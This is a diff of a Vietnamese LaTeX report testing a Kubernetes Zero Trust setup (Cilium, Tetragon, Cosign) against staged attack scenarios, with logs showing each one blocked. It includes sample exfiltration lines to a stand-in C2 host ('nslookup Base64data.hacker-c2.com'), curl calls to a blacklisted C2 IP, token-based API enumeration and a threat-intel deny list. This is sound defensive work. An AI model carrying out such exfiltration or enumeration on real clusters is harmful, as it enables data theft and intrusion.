+Trong kiến trúc mạng Kubernetes truyền thống dựa trên \texttt{iptables}/\texttt{kube-proxy}, tường lửa Linux chỉ so khớp tĩnh dựa trên địa chỉ IP đích và nguồn ghi trên Header của gói tin. Do gói tin mang địa chỉ IP của \texttt{job-service} (thực thể hợp lệ được phép kết nối với MySQL), gói tin giả mạo sẽ dễ dàng lách qua bộ lọc biên để tiếp cận dữ liệu nhạy cảm.
+
+Tuy nhiên, đối với hạ tầng an ninh mạng hiện đại ứng dụng eBPF (Cilium CNI), cơ chế xác thực danh tính được thực thi trực tiếp tại Kernel Space thông qua bảng ánh xạ \texttt{cilium\_ipcache} thời gian thực. Cilium eBPF liên tục đồng bộ thông tin từ Kubernetes API Server để biết chính xác mỗi giao diện card mạng ảo (\texttt{veth}) của Pod thực sự sở hữu định danh bảo mật (Security Identity) và dải IP nào. 
+
+Khi gói tin thô mang IP nguồn giả mạo bước ra khỏi card mạng ảo của \texttt{hiring-service}, chương trình eBPF đính kèm tại điểm vào mạng phát hiện sự lệch pha nghiêm trọng: *"Giao diện mạng phát ra gói tin thuộc sở hữu của Pod hiring-service (Identity ID: 13257), nhưng IP nguồn khai báo trong Header lại là của job-service"*. Cilium lập tức thực hiện hành động hủy gói tin (\texttt{DROP}) ngay tại tầng Kernel nguồn trước khi gói tin kịp truyền đi trên đường truyền vật lý.
+
+\textbf{Giai đoạn 3: Thoát sandbox và Thao túng tiến trình để cướp Socket (T1611 \& T1055):}\\
+Bị CNI chặn đứng mọi nỗ lực giả mạo ở tầng mạng, hacker cao cấp buộc phải sử dụng kỹ thuật thoát vách ngăn container (\texttt{Escape to Host --- T1611}) thông qua khai thác các lỗ hổng của Container Runtime để chiếm quyền điều khiển trực tiếp trên Node vật lý. Sau đó, hacker thực hiện Process Injection (\texttt{T1055}), xâm nhập vào không gian Namespace mạng (\texttt{Network Namespace}) của chính tiến trình \texttt{job-service} hợp lệ đang chạy trên cùng Node. Từ đây, hacker cướp Socket thật của \texttt{job-service} để truyền thông dữ liệu. Lúc này, do card mạng ảo phát ra và IP nguồn đều trùng khớp hoàn toàn, bộ lọc eBPF sẽ chấp nhận gói tin. Để phản ứng, bộ giám sát runtime Tetragon liên tục theo dõi phả hệ tiến trình tại Ring 0, phát hiện lời gọi hệ thống \texttt{sys\_connect} dị thường không xuất phát từ ứng dụng gốc, lập tức kích hoạt cô lập mạng toàn diện Pod và gửi cảnh báo tự động về trung tâm điều hành.
+
+\begin{figure}[H]
+\centering
+\begin{tikzpicture}[
+  font=\sffamily,
+  atk/.style={draw=red!50, rounded corners=3pt, fill=red!6, thick,
+    minimum height=12mm, inner sep=6pt, align=center, text width=4.2cm},
+  def/.style={draw=green!60!black, rounded corners=3pt, fill=green!6, thick,
+    minimum height=12mm, inner sep=6pt, align=center, text width=4.2cm},
+  blk/.style={draw=red!70!black, rounded corners=3pt, fill=red!15, very thick,
+    minimum height=12mm, inner sep=6pt, align=center, text width=4.2cm},
+  flow/.style={->, >=stealth, thick},
+]
+
+\node[atk] at (2.0, 0) (pod) {hiring-service\\(Bị xâm nhập)\\Root / Filesystem Writable};
+\node[atk] at (13.0, 0) (spoof) {Mô phỏng Raw Socket\\IP Spoofing (T1036)};
+\node[def] at (13.0, -3.5) (cni) {Cilium eBPF trong Kernel\\\texttt{cilium\_ipcache} Identity};
+\node[blk] at (2.0, -3.5) (drop) {Phát hiện lệch pha\\veth = hiring-service\\IP = job-service\\$\rightarrow$ Drop tại Kernel};
+
+\draw[flow, red!60] (pod) -- (spoof);
+\draw[flow, red!60] (spoof) -- node[right, font=\small] {Raw Packet} (cni);
+\draw[flow, green!60!black, very thick] (cni) -- node[above, font=\small] {Kiểm tra danh tính} (drop);
+
+\end{tikzpicture}
+\caption{Kịch bản 4: CNI phát hiện lệch pha danh tính động và IP nguồn}
+\label{fig:kb4_identity_spoofing}
+\end{figure}
+
+\textbf{Minh chứng thực nghiệm:}\\
+Hành vi giả mạo gói tin IP được thực hiện trực tiếp trong container \texttt{hiring-service} hướng tới cơ sở dữ liệu MySQL của namespace \texttt{data}. Kết quả kiểm tra ghi và tải gói mạng thất bại, cùng với log chi tiết từ bộ giám sát Hubble tại Kernel đích chứng minh hành vi chặn đứng thành công:
+
+\begin{listing}[H]
+\begin{minted}[fontsize=\footnotesize]{bash}
+# 1. Thử nghiệm khả năng ghi đè trên hệ điều hành container (Image Not Read-Only)
+$ kubectl -n job7189-apps exec hiring-service-86b448cb56-zw5qm -c app -- touch /tmp/test_write
+[exit=0]  # Khả năng ghi đè được kích hoạt do thiếu cấu hình readOnlyRootFilesystem
+
+# 2. Thử nghiệm cài đặt gói scapy để tấn công (Egress bị cô lập hoàn toàn)
+$ kubectl -n job7189-apps exec hiring-service-86b448cb56-zw5qm -c app -- apt-get update
+Err:1 http://deb.debian.org/debian bookworm InRelease
+  Cannot initiate the connection to deb.debian.org:80 (146.75.118.132). - connect (101)
+[exit=124]  # Connection timed out - eBPF Egress Filter chặn đứng kết nối Internet
+
+# 3. Theo dõi Ingress Drop bằng Hubble tại nút đích (7189srv05 chứa MySQL)
+$ TARGET_NODE="7189srv05"
+$ TARGET_CILIUM="pod/cilium-55727"
+$ kubectl -n kube-system exec -it $TARGET_CILIUM -- hubble observe --verdict DROPPED -f
+May 29 11:57:34.037: job7189-apps/hiring-service-86b448cb56-zw5qm:40592 (ID:13257) <> data/mysql-f5fb77767-jhd8j:3306 (ID:28370) Policy denied DROPPED (TCP Flags: SYN)
+May 29 11:57:34.261: job7189-apps/hiring-service-86b448cb56-zw5qm:56556 (ID:13257) <> data/mysql-f5fb77767-jhd8j:3306 (ID:28370) policy-verdict:none TRAFFIC_DIRECTION_UNKNOWN DENIED (TCP Flags: SYN)
+\end{minted}
+\caption{Kiểm tra tính writable, cài đặt thất bại và Log của Hubble ghi nhận sự kiện DROP}
+\label{lst:kb4_hubble_cmd}
+\end{listing}
+
+
+%--------------------------------------------------------------
+\subsection{Kịch bản 5: Xây dựng kênh bí mật và Trích xuất dữ liệu qua biên Egress}
+\label{subsec:kb5_dns_tunneling}
+%--------------------------------------------------------------
+
+\textbf{Bề mặt tấn công:} Tuyến lưu lượng Egress và hạ tầng DNS.
+
+\textbf{Giai đoạn 1: Nỗ lực trích xuất trực tiếp qua Web (T1041 \& T1071.001):}\\
+Hacker gửi HTTP POST chứa dữ liệu nhạy cảm thẳng tới \texttt{api.hacker-c2.com} (T1041).
+
+\textbf{Giai đoạn 2: Lọc FQDN tại Kernel:}\\
+CNI không dựa vào IP tĩnh mà tự động ánh xạ IP phân giải từ truy vấn DNS hợp lệ. Gọi thẳng bằng IP lạ hoặc tên miền ngoài danh sách trắng (FQDN Whitelist) sẽ bị huỷ từ gọi tin SYN đầu tiên.
+
+\textbf{Giai đoạn 3: Kỹ thuật Đào hầm DNS (T1071.004 \& T1048.003):}\\
+Hacker mã hoá dữ liệu vào subdomain (VD: \texttt{nslookup Base64data.hacker-c2.com}) để tuồn qua trung gian CoreDNS. ZTA phản ứng bằng cách thanh tra giao thức L7: chặn các truy vấn hướng đến tên miền lạ và áp dụng Rule Rate Limiting khi có truy vấn bất thường.
+
+\begin{figure}[H]
+\centering
+\begin{tikzpicture}[
+  font=\sffamily,
+  atk/.style={draw=red!50, rounded corners=3pt, fill=red!6, thick,
+    minimum height=12mm, inner sep=6pt, align=center},
+  blk/.style={draw=red!70!black, rounded corners=3pt, fill=red!15, very thick,
+    minimum height=12mm, inner sep=6pt, align=center},
+  def/.style={draw=green!60!black, rounded corners=3pt, fill=green!6, thick,
+    minimum height=12mm, inner sep=6pt, align=center},
+  flow/.style={->, >=stealth, thick},
+]
+\node[atk, text width=3.6cm] at (7.5, 0) (data) {Dữ liệu nhạy cảm};
+
+\node[atk, text width=3.8cm] at (2.2, -2.2) (curl) {curl POST C2\\(T1041 / T1071.001)};
+\node[blk, text width=3.8cm] at (2.2, -4.6) (fqdn) {CNI FQDN Egress\\$\rightarrow$ \textbf{Drop}};
+
+\node[atk, text width=4.0cm] at (12.8, -2.2) (dns) {nslookup C2 Domain\\(T1048.003 / T1071.004)};
+\node[blk, text width=4.0cm] at (12.8, -4.6) (l7) {DNS Proxy L7\\$\rightarrow$ \textbf{Từ chối}};
+
+\node[def, text width=8.5cm] at (7.5, -7.2) (isolate) {Phân tích hành vi: Bất thường truy vấn\\$\rightarrow$ \textbf{Cô lập mạng Pod}};
+
+\draw[flow, red!60] (data.south) -- (curl.north);
+\draw[flow, red!60] (data.south) -- (dns.north);
+\draw[flow] (curl) -- (fqdn);
+\draw[flow] (dns) -- (l7);
+\draw[flow, green!60!black, very thick] (fqdn.south) |- (isolate.west);
+\draw[flow, green!60!black, very thick] (l7.south) |- (isolate.east);
+\end{tikzpicture}
+\caption{Kịch bản 5: Chặn trích xuất dữ liệu qua HTTP FQDN và DNS L7}
+\label{fig:kb5_dns_tunneling}
+\end{figure}
+
+\textbf{Minh chứng thực nghiệm:}\\
+Cố gắng thực hiện lệnh truy xuất (Egress) tới địa chỉ IP lạ nằm ngoài Whitelist FQDN, kết quả trả về \texttt{Connection timed out} vì luồng đã bị drop ở network layer:
+\begin{listing}[H]
+\begin{minted}[fontsize=\footnotesize]{bash}
+$ kubectl -n job7189-apps exec job-service-65f9f7cfcb-f6zkl -c app -- \
+    curl -sS -m 8 -o /dev/null -w 'HTTP %{http_code}\n' -X DELETE \
+    http://1.1.1.1
+HTTP 000
+curl: (28) Connection timed out after 8001 milliseconds
+command terminated with exit code 28
+\end{minted}
+\caption{Lệnh mô phỏng hành vi trích xuất dữ liệu bị chặn gây ra timeout}
+\label{lst:kb5_egress_cmd}
+\end{listing}
+
+Và log Hubble ở cấp hệ thống xác nhận gói tin bị Kernel chặn do vi phạm Egress Policy:
+\begin{listing}[H]
+\begin{minted}[fontsize=\footnotesize]{text}
+$ hubble observe --since 2m --verdict DROPPED --from-namespace job7189-apps
+May 28 09:30:15.221: job7189-apps/job-service-65f9f7cfcb-f6zkl:34660 (ID:5287)
+  <> 1.1.1.1:80 (world) Policy denied DROPPED (TCP Flags: SYN)
+\end{minted}
+\caption{Kết nối Egress bị Kernel Drop do không nằm trong FQDN Whitelist}
+\label{lst:kb5_egress_drop}
+\end{listing}
+
+
+%--------------------------------------------------------------
+\subsection{Kịch bản 6: Chặn kết nối tới IP độc hại (Threat Intelligence)}
+\label{subsec:kb6_threat_intel}
+%--------------------------------------------------------------
+
+\textbf{Bề mặt tấn công:} Các kết nối Egress trực tiếp từ cụm Microservices hướng tới các máy chủ điều khiển và chỉ huy độc hại (C2 Server).
+
+\textbf{Giai đoạn 1: Kết nối trực tiếp đến IP độc hại:}\\
+Sau khi thiết lập được chỗ đứng trong container nghiệp vụ, hacker tìm cách thiết lập kênh truyền thông ngược ra ngoài Internet về máy chủ chỉ huy C2 hòng duy trì kết nối và chuẩn bị trích xuất dữ liệu. Để lách qua các bộ lọc tên miền DNS (như chính sách L7 FQDN đã phân tích ở Kịch bản 5), hacker bỏ qua phân giải tên miền và sử dụng trực tiếp địa chỉ IP số thô của máy chủ C2 (\texttt{1.19.0.1} - một IP đã được ghi nhận trong danh sách đen máy chủ độc hại toàn cầu) để kết nối trực tiếp (\texttt{Application Layer Protocol --- T1071.001} hoặc \texttt{Ingress Tool Transfer --- T1105}).
+
+\textbf{Giai đoạn 2: Cập nhật động danh sách đen qua CIDR Group:}\\
+Trong môi trường đám mây động, việc duy trì thủ công các quy tắc tường lửa dựa trên IP tĩnh là hoàn toàn bất khả thi. Để giải quyết rách việc này, hệ thống áp dụng cơ chế tự động hóa tình báo mối đe dọa (Threat Intelligence Automation):
 \begin{itemize}
-    \item HTTP connection setup + SSL handshake (nếu có)
-    \item OPA evaluation (1.3ms)
-    \item Request buffering trong Kong
-    \item Network round-trip overhead
+    \item Một thành phần tự động hóa (\texttt{threat-intel-refresh} CronJob) được triển khai tại namespace \texttt{security-cdm}. Định kỳ mỗi giờ, CronJob tự động kết nối ra các nguồn cung cấp dữ liệu tình báo uy tín toàn cầu (như danh sách FireHOL Level 1 chứa dữ liệu Tor exit nodes, botnets, các dải IP C2 đã biết), lọc và parse tự động.
+    \item Dữ liệu sau đó được nạp động vào tài nguyên Kubernetes mở rộng của Cilium: \texttt{CiliumCIDRGroup} với tên gọi \texttt{threat-intel-firehol}.
+    \item Chính sách an ninh mạng cấp cụm \texttt{CiliumClusterwideNetworkPolicy} (\texttt{cnp-threat-intel-egress-deny}) được cấu hình liên kết trực tiếp với CIDR Group này. Chính sách tự động áp dụng luật chặn đứng (\texttt{egressDeny}) đối với mọi gói tin có đích đến nằm trong danh sách đen, ngoại trừ các dải IP nội bộ cần thiết.
 \end{itemize}
 
-Tổng overhead ZTA lớp Gateway: \textbf{~10x so với OPA logic thuần} (1.3ms logic, nhưng 180ms end-to-end). Nguyên nhân chủ yếu từ connection management, không phải từ policy evaluation logic.
+\textbf{Giai đoạn 3: Ngăn chặn tự động tại Kernel Space bằng eBPF Map:}\\
+Khi danh sách IP trong \texttt{CiliumCIDRGroup} thay đổi, Cilium Agent tự động biên dịch lại các dải CIDR thành một cấu trúc eBPF LPM (Longest Prefix Match) Map hiệu năng cao và nhúng trực tiếp vào không gian nhân (Kernel Space). 
 
-% ============================================================
-\section{Phân tích và Luận thảo}
-\label{sec:discussion}
-% ============================================================
+Khi hacker trong Pod phát lệnh kết nối TCP tới IP độc hại \texttt{1.19.0.1}, Kernel Linux lập tức đối chiếu gói tin SYN đầu tiên với cấu trúc eBPF LPM Map tại card mạng ảo veth. Phát hiện IP đích thuộc danh sách đen bị cấm, eBPF thực thi hành động hủy gói tin ngay tại tầng Ring 0 mà không cần tốn chi phí định tuyến qua firewall hay DNS. Kết nối bị dập tắt lập tức, hacker nhận về lỗi \texttt{Connection timed out} sau vài giây.
 
-\subsection{Hiệu quả bảo mật và khả năng thi hành}
+\begin{figure}[H]
+\centering
+\begin{tikzpicture}[
+  font=\sffamily,
+  atk/.style={draw=red!50, rounded corners=3pt, fill=red!6, thick,
+    minimum height=12mm, inner sep=6pt, align=center},
+  blk/.style={draw=red!70!black, rounded corners=3pt, fill=red!15, very thick,
+    minimum height=12mm, inner sep=6pt, align=center},
+  def/.style={draw=green!60!black, rounded corners=3pt, fill=green!6, thick,
+    minimum height=12mm, inner sep=6pt, align=center},
+  sys/.style={draw=blue!50, rounded corners=3pt, fill=blue!6, thick,
+    minimum height=12mm, inner sep=6pt, align=center},
+  flow/.style={->, >=stealth, thick},
+]
+\node[sys, text width=3.6cm] at (2.0, 0) (cron) {CronJob\\Đồng bộ IP độc hại};
+\node[def, text width=3.8cm] at (8.5, 0) (cidr) {CiliumCIDRGroup};
 
-Kiến trúc 5 lớp đã chứng minh được khả năng chặn đúng các vector tấn công thiết kế:
-\begin{itemize}
-    \item \textbf{Layer 1 (Edge/Network):} Cilium eBPF chặn 98\% di chuyển ngang, ngăn chặn toàn bộ port không được phép.
-    \item \textbf{Layer 2 (API Gateway):} Kong + OPA ngăn chặn 100\% unauthorized requests, enforce per-request authorization.
-    \item \textbf{Layer 3 (Secrets/Vault):} Dynamic credentials tự động revoke, credential reuse 100\% không khả thi.
-    \item \textbf{Layer 4 (Identity/mTLS):} SPIRE SVID binding enforcement; unauthenticated HTTPS connections bị reject.
-    \item \textbf{Layer 5 (Runtime/Tetragon):} Phát hiện anomaly (khi BPF kernel tương thích), tự động isolation via PDP.
-\end{itemize}
+\node[atk, text width=3.6cm] at (2.0, -3.2) (pod) {Pod nghiệp vụ};
+\node[blk, text width=4.0cm] at (8.5, -3.2) (ebpf) {Kernel eBPF Map\\So khớp IP $\rightarrow$ Drop};
+\node[atk, text width=2.8cm] at (13.5, -3.2) (c2) {C2 Server IP};
 
-\subsection{Overhead hiệu năng}
+\draw[flow] (cron) -- node[above, font=\small] {Cập nhật IP} (cidr);
+\draw[flow, red!60] (pod) -- node[above, font=\small] {Kết nối IP lạ} (ebpf);
+\draw[flow, green!60!black, very thick] (cidr) -- node[left, font=\small] {Đồng bộ} (ebpf);
+\draw[flow, red!60, dashed] (ebpf) -- node[above, font=\small] {Bị chặn} (c2);
+\end{tikzpicture}
+\caption{Kịch bản 6: Đồng bộ Threat Intel và chặn kết nối IP độc hại tại Kernel}
+\label{fig:kb6_threat_intel}
+\end{figure}
 
-Overhead của ZTA lớp Gateway (Kong+OPA) đạt ~180-220ms P50, tương đương ~10x OPA logic. Tuy nhiên:
-\begin{itemize}
-    \item \textbf{Chấp nhận được cho service-to-service:} Vi dịch vụ thường có SLA ~500-1000ms; overhead 180ms nằm trong ngưỡng.
-    \item \textbf{Không phải bottleneck:} Throughput đạt ~97-103 req/s, đủ cho enterprise workload.
-    \item \textbf{Tối ưu khả thi:} Connection pooling, disable buffering có thể giảm overhead xuống 50-100ms.
-\end{itemize}
+\textbf{Minh chứng thực nghiệm:}\\
+Cấu hình chính sách cấp cụm chặn danh sách đen, cấu trúc CIDR Group đang chứa dải IP độc hại, cùng với kết quả thử nghiệm đối chứng (Control Group vs. Experimental Group) và log Hubble tại Kernel đích:
 
-\subsection{Giới hạn và hướng phát triển Phase 5.E}
+\begin{listing}[H]
+\begin{minted}[fontsize=\footnotesize]{yaml}
+# 1. Trích xuất chính sách CiliumClusterwideNetworkPolicy chặn danh sách đen
+apiVersion: cilium.io/v2
+kind: CiliumClusterwideNetworkPolicy
+metadata:
+  name: cnp-threat-intel-egress-deny
+spec:
+  egressDeny:
+  - toCIDRSet:
+    - cidrGroupRef: threat-intel-firehol
+      except:
+      - 100.64.0.0/10
+\end{minted}
+\caption{Định nghĩa chính sách chặn toàn cụm theo CIDR Group}
+\label{lst:kb6_ccnp_yaml}
+\end{listing}
 
-Ba hạn chế chính cần xử lý trong phase tiếp theo:
-\begin{enumerate}
-    \item \textbf{Tetragon BPF kernel incompatibility:} v1.2.0 không support kernel 6.8 (Ubuntu node). Cần upgrade Tetragon ≥ v1.4+ hoặc downgrade kernel → 6.1.
-    \item \textbf{Kong upstream service connectivity:} Một số endpoint (`/api/health`, `/api/public/jobs`) trả 499. Nguyên nhân: route misconfiguration hoặc OPA policy blocking. Cần deep-dive vào Kong/OPA logs.
-    \item \textbf{Baseline latency comparison:} Chưa test Baseline (không ZTA); cần etcd snapshot restore để đo ZTA overhead thực.
+\begin{listing}[H]
+\begin{minted}[fontsize=\footnotesize]{bash}
+# 2. Kiểm tra tài nguyên CiliumCIDRGroup đã đồng bộ dải IP độc hại FireHOL thành công
+$ kubectl get ciliumcidrgroup threat-intel-firehol -o yaml | head -n 25
+apiVersion: cilium.io/v2
+kind: CiliumCIDRGroup
+metadata:
+  name: threat-intel-firehol
+spec:
+  externalCIDRs:
+  - 0.0.0.0/8
+  - 1.10.16.0/20
+  - 1.19.0.0/16
+  - 1.32.128.0/18
+
+# 3. NHÓM ĐỐI CHỨNG (Control Group): Gọi dịch vụ hợp lệ trong cụm từ job-service
+# Kết nối mạng thông thường hoàn toàn khỏe mạnh, trả về mã trạng thái HTTP 200 thành công
+$ kubectl -n job7189-apps exec job-service-65f9f7cfcb-xg95r -c app -- \
+    curl -sS -o /dev/null -w 'HTTP %{http_code}\n' \
+    http://workspace-service:80/api/v1/internal/workspaces
+HTTP 200
+[exit=0]
+
+# 4. NHÓM THỬ NGHIỆM (Experimental Group): Gọi trực tiếp đến IP độc hại 1.19.0.1
+# Lệnh timeout hoàn toàn do gói tin bị chặn đứng ngay tại veth của Kernel
+$ kubectl -n job7189-apps exec job-service-65f9f7cfcb-xg95r -c app -- \
+    curl -sS --connect-timeout 3 http://1.19.0.1/
+curl: (28) Failed to connect to 1.19.0.1 port 80 after 3000 ms: Timeout was reached
+[exit=28]
+
+# 5. Trích xuất log Hubble từ Cilium Agent trên nút chứa Pod (7189srv03)
+# Log Hubble chỉ ra rõ ràng lý do là "Policy denied by denylist DROPPED" tại Kernel
+$ kubectl -n kube-system exec cilium-xmj2n -c cilium-agent -- \
+    hubble observe --since 15m --to-ip 1.19.0.1
+May 29 12:24:24.276: job7189-apps/job-service-65f9f7cfcb-xg95r:42336 (ID:23487) <> 1.19.0.1:80 (ID:16777217) Policy denied by denylist DROPPED (TCP Flags: SYN)
+\end{minted}
+\caption{Kiểm tra CIDR Group, đối chứng kết nối mạng và log Hubble tại Kernel nút chứa Pod}
+\label{lst:kb6_cidr_cmd}
+\end{listing}
+
+
+%--------------------------------------------------------------
+\subsection{Kịch bản 7: Thỏa hiệp chuỗi cung ứng và Vượt rào Cổng nạp}
+\label{subsec:kb7_supply_chain}
+%--------------------------------------------------------------
+
+\textbf{Bề mặt tấn công:} API Server, hệ thống ServiceAccount và Quy trình nạp Image.
+
+\textbf{Giai đoạn 1: Lạm dụng danh tính Workload (T1078.003, T1610, T1611 \& T1195.002):}\\
+Hacker trích xuất ServiceAccount token (T1078.003) có quyền CREATE pods. Hacker gửi REST API để khởi tạo một Pod dùng Image chứa backdoor (T1195.002), đính cờ \texttt{privileged: true} (T1611) hòng thoát container ra Host (T1610).
+
+\textbf{Giai đoạn 2: Cổng nạp Validating Webhooks:}\\
+Yêu cầu CREATE phải qua OPA Gatekeeper (chặn \texttt{privileged}) và Sigstore Cosign Policy Controller. Image không mang chữ ký mật mã (Cryptographic Signature) hợp lệ sẽ bị từ chối dứt khoát.
+
+\textbf{Giai đoạn 3: Làm mù Webhook và lách thẻ hình ảnh (T1562.001 \& T1195.002):}\\
+Hacker cố xóa Webhook (T1562.001) nhưng bị chặn bởi RBAC. Chúng chuyển sang đổi nội dung Image nhưng giữ nguyên Thẻ (Tag). Cosign tự phân giải tag thành mã băm (SHA256 Digest) bất biến trong pha Mutating. Image giả mạo bị loại bỏ.
+
+\textbf{Minh chứng thực nghiệm:}\\
+Cố gắng chạy một Pod chứa Image chưa được ký duyệt:
+\begin{listing}[H]
+\begin{minted}[fontsize=\footnotesize]{bash}
+$ cat <<EOF | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: unsigned-attacker-20260528-163135
+  namespace: job7189-apps
+spec:
+  containers:
+  - name: malicious-app
+    image: ghcr.io/job7189/identity-service:malicious-tag
+EOF
+
+Error from server (BadRequest): error when creating "STDIN": admission webhook 
+"policy.sigstore.dev" denied the request: validation failed: 
+invalid image signature: ghcr.io/job7189/identity-service:malicious-tag
+no matching signatures found for authority "zta-cosign-key"
+\end{minted}
+\caption{Lệnh triển khai Image giả mạo bị Admission Webhook từ chối vì thiếu chữ ký}
+\label{lst:kb7_cosign_cmd}
+\end{listing}
+
+
+%--------------------------------------------------------------
+\subsection{Kịch bản 8: Khám phá mạng nội bộ và Tước Linux Capabilities}
+\label{subsec:kb8_discovery}
+%--------------------------------------------------------------
+
+\textbf{Bề mặt tấn công:} Mạng nội bộ cụm (Pod CIDR, Service DNS) và đặc quyền hệ điều hành (Linux Capabilities).
+
+\textbf{Giai đoạn 1: Vô hiệu hóa bộ công cụ trinh sát (T1046 \& T1040):}\\
+Sau khi chiếm quyền một Pod, bước đầu tiên của hacker là trinh sát: cài \texttt{nmap} để quét cổng (T1046) và \texttt{tcpdump} để nghe lén lưu lượng (T1040). ZTA vô hiệu hóa hoàn toàn hướng tấn công này qua ba tầng:
+\begin{enumerate}[nosep]
+  \item \textbf{Tước toàn bộ Capabilities:} Cấu hình \texttt{securityContext} khai báo \texttt{capabilities:\{drop:[ALL]\}}, kết quả là \texttt{CapEff = 0x0000000000000000} --- Pod không còn bất kỳ đặc quyền nào, bao gồm \texttt{CAP\_NET\_RAW} (cần cho \texttt{tcpdump}, \texttt{ping}, raw socket).
+  \item \textbf{Hệ thống tệp chỉ đọc:} Cấu hình \texttt{readOnlyRootFilesystem: true} ngăn hacker ghi tệp nhị phân mới lên đĩa, khiến lệnh \texttt{apt-get install} thất bại.
+  \item \textbf{Xác thực ảnh chứa (Kịch bản~\ref{subsec:kb7_cosign}):} Nếu hacker cố triển khai một Pod mới chứa \texttt{nmap}, Admission Webhook Cosign sẽ từ chối do ảnh không có chữ ký hợp lệ.
 \end{enumerate}
 
-Tham khảo file `doc/phase5d-verification/ITEM_I_UPSTREAM_INVESTIGATION.md` để biết chi tiết điều tra và next steps.
+\textbf{Giai đoạn 2: Trinh sát thủ công bằng công cụ có sẵn (T1046 \& T1018):}\\
+Không thể cài công cụ chuyên dụng, hacker buộc phải dùng \texttt{curl} có sẵn trong container để quét mạng thủ công. Tuy nhiên, chính sách \texttt{default-deny-all} của CiliumNetworkPolicy chặn mọi kết nối không được khai báo tường minh --- cả nội bộ namespace lẫn xuyên namespace:
+
+\textbf{Giai đoạn 3: Liệt kê tài nguyên qua API Server (T1613):}\\
+Hacker đọc ServiceAccount token được mount tự động và gọi lên Kubernetes API Server để liệt kê danh sách dịch vụ trong namespace khác (T1613). CiliumNetworkPolicy chặn Egress đến API Server, khiến lệnh curl bị timeout trước cả khi RBAC có cơ hội từ chối.
+
+\textbf{Minh chứng thực nghiệm:}
+
+\textit{Bước 1: Xác nhận Pod đã bị tước toàn bộ Capabilities.}
+\begin{listing}[H]
+\caption{Kiểm tra Capabilities thực tế --- CapEff = 0 nghĩa là không còn đặc quyền nào}
+\label{lst:kb8_capeff}
+\begin{minted}[fontsize=\footnotesize]{bash}
+$ kubectl -n job7189-apps exec job-service-65f9f7cfcb-xg95r -c app -- \
+    cat /proc/1/status | grep Cap
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000    # <-- Không có bất kỳ capability nào
+CapBnd: 00000000a80425fb
+CapAmb: 0000000000000000
+\end{minted}
+\end{listing}
+
+\textit{Bước 2: Quét mạng thủ công --- mọi hướng đều bị chặn bởi CiliumNetworkPolicy.}
+\begin{listing}[H]
+\caption{Curl trinh sát đa hướng: cùng namespace, xuyên namespace --- tất cả đều timeout}
+\label{lst:kb8_scan_cmd}
+\begin{minted}[fontsize=\footnotesize]{bash}
+# Quét dịch vụ cùng namespace (hiring-service)
+$ kubectl -n job7189-apps exec job-service-65f9f7cfcb-xg95r -c app -- \
+    curl -s --connect-timeout 2 http://hiring-service:3000/health
+command terminated with exit code 28    # TIMEOUT - bị CNP chặn
+
+# Quét dịch vụ khác namespace (mysql.data)
+$ kubectl -n job7189-apps exec job-service-65f9f7cfcb-xg95r -c app -- \
+    curl -s --connect-timeout 2 http://mysql.data:3306
+command terminated with exit code 28    # TIMEOUT - bị CNP chặn
+\end{minted}
+\end{listing}
+
+\textit{Bước 3: Liệt kê tài nguyên qua API Server --- CNP chặn trước cả RBAC.}
+\begin{listing}[H]
+\caption{Truy vấn API Server để liệt kê dịch vụ bị CNP chặn Egress}
+\label{lst:kb8_api_cmd}
+\begin{minted}[fontsize=\footnotesize]{bash}
+$ kubectl -n job7189-apps exec job-service-65f9f7cfcb-xg95r -c app -- \
+    curl -sk --connect-timeout 5 \
+    https://kubernetes.default.svc/api/v1/namespaces/data/services
+command terminated with exit code 28    # TIMEOUT - Egress đến API Server bị chặn
+\end{minted}
+\end{listing}
+
+
+%--------------------------------------------------------------
+\subsection{Kịch bản 9: Khai thác Kubelet API và Thoát sandbox}
+\label{subsec:kb9_kubelet}
+%--------------------------------------------------------------
+
+\textbf{Bề mặt tấn công:} Mặt phẳng điều khiển nội bộ của Node (Kubelet API cổng 10250) và các cơ chế cô lập của nhân Linux (\texttt{Namespaces}, \texttt{Cgroups}).
+
+\textbf{Giai đoạn 1: Dò tìm Default Gateway và Tấn công Kubelet API (T1046 \& T1210):}\\
+Hacker sau khi có được chỗ đứng trong container nghiệp vụ (ví dụ \texttt{job-service}) nhận thấy các luồng di chuyển ngang đều bị CNI chặn. Tuy nhiên, mọi container đều phải có một tuyến đường định tuyến mặc định (\texttt{Default Route}) trỏ về IP của Node vật lý chứa nó. Hacker tiến hành trinh sát để phát hiện địa chỉ IP của Node vật lý (ví dụ: \texttt{100.114.68.15}). 
+
+Hacker sử dụng các công cụ truyền mạng để bắt đầu thực hiện rà quét thăm dò cổng dịch vụ (\texttt{Network Service Discovery --- T1046}) hướng vào cổng \texttt{10250} của Node vật lý --- đây là cổng mặc định của Kubelet API. Mục tiêu của kẻ tấn công là gọi tới endpoint \texttt{/pods} để thu hoạch thông tin tài nguyên hệ thống, hoặc lạm dụng endpoint \texttt{/exec} hòng nhảy sang các container đặc quyền cao hơn đang chạy chung Node như \texttt{vault-agent} để chiếm toàn quyền cụm (\texttt{Exploitation of Remote Services --- T1210}).
+
+\textbf{Giai đoạn 2: Lỗ hổng Kubelet API mặc định vs. Phân đoạn Host-level và Cấu hình an ninh:}\\
+Trong các cụm Kubernetes mặc định không được thiết lập an toàn, Kubelet API thường chạy ở chế độ chấp nhận yêu cầu vô danh (\texttt{--anonymous-auth=true}), cho phép bất kỳ kết nối mạng nào tới cổng 10250 đều có thể truy xuất thông tin và thực thi lệnh tùy ý.
+
+Trong kiến trúc ZTA của hệ thống, nỗ lực này bị bẻ gãy ở cả hai lớp phòng thủ mạng và ứng dụng:
+\begin{itemize}
+    \item \textbf{Phòng thủ tầng mạng (eBPF Host-level Egress):} Chính sách an ninh CiliumNetworkPolicy áp dụng chặt chẽ quy tắc chặn đứng mọi luồng Egress hướng đến dải IP của Host Node vật lý (ngoại trừ cổng UDP/53 cấp cho CoreDNS). Mọi nỗ lực kết nối tới cổng 10250 từ Pod nghiệp vụ đều bị eBPF hủy ngay tại card mạng ảo veth.
+    \item \textbf{Cấu hình Kubelet Hardening (CIS Benchmark):} Kể cả khi hacker vượt qua bộ lọc mạng, Kubelet được cấu hình an toàn tuyệt đối theo chuẩn CIS Benchmark với \texttt{--anonymous-auth=false} và \texttt{--authorization-mode=Webhook}. Kubelet từ chối các yêu cầu vô danh và chuyển tiếp xác thực qua API Server, dập tắt kỹ thuật \texttt{T1210}.
+\end{itemize}
+
